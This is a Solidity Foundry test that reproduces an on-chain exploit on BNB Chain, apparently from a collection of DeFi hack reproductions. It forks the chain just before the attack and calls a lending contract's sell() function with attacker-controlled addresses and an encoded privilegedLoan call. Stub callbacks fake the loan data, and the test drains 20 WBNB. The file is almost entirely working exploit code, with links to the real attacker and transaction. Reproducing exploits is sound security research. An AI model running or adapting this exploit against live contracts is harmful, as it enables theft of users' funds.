// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";

// @KeyInfo - Total Lost : 20 WBNB
// Attacker : https://bscscan.com/address/0x3fee6d8aaea76d06cf1ebeaf6b186af215f14088
// Attack Contract : https://bscscan.com/address/0xe82Fc275B0e3573115eaDCa465f85c4F96A6c631
// Vulnerable Contract : https://bscscan.com/address/0x8c7f34436C0037742AeCf047e06fD4B27Ad01117
// Attack Tx : https://bscscan.com/tx/0xc291d70f281dbb6976820fbc4dbb3cfcf56be7bf360f2e823f339af4161f64c6

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x8c7f34436C0037742AeCf047e06fD4B27Ad01117#code

// @Analysis
// Post-mortem : N/A
// Twitter Guy : N/A
// Hacking God : N/A
pragma solidity ^0.8.0;

contract ExploitTemplate is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 63856735 - 1;
    BorrowerOperationsV6 borrowerOper = BorrowerOperationsV6(0x616B36265759517AF14300Ba1dD20762241a3828);
    address WBNB = address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);

    function setUp() public {
        vm.createSelectFork("bsc", blocknumToForkFrom);
        fundingToken = WBNB;
    }

    function testExploit() public balanceLog {
        uint256 loadId = 0;
        bytes memory sellingCode = abi.encodeWithSignature("privilegedLoan(address,uint256)", WBNB, 20 ether);
        address tokenHolder = address(this);
        address inchRouter = address(0x2EeD3DC9c5134C056825b12388Ee9Be04E522173);
        address integratorFeeAddress = address(this);
        address whitelistedDex = address(this);
        borrowerOper.sell(loadId, sellingCode, tokenHolder, inchRouter, integratorFeeAddress, whitelistedDex);
    }

    function loans(uint256 arg0) public returns(Loan memory) {
        Collateral memory c = Collateral(WBNB, 0, 0, false, 0, 0, 0);
        Loan memory l = Loan(0, 0, c, 0, 0, address(this), 0);
        return l;
    }

    function repayLoan(uint256 loadId, bool payInStablecoin) public {}

    function privilegedLoan(address flashLoanToken, uint256 amount) public {}
}

struct Loan {
    uint256 id;
    uint256 amount;
    Collateral collateral;
    uint256 collateralAmount;
    uint256 timestamp;
    address borrower;
    uint256 userPaid;
}


struct Collateral {
    address collateralAddress;
    uint256 maxLendPerToken;
    uint256 interestRate;
    bool active;
    uint256 minAmount;
    uint256 maxExposure;
    uint256 currentExposure;
}

interface BorrowerOperationsV6 {
    function sell(uint256 loanId, bytes calldata sellingCode, address tokenHolder, address inchRouter, address integratorFeeAddress, address whitelistedDex) external payable;
}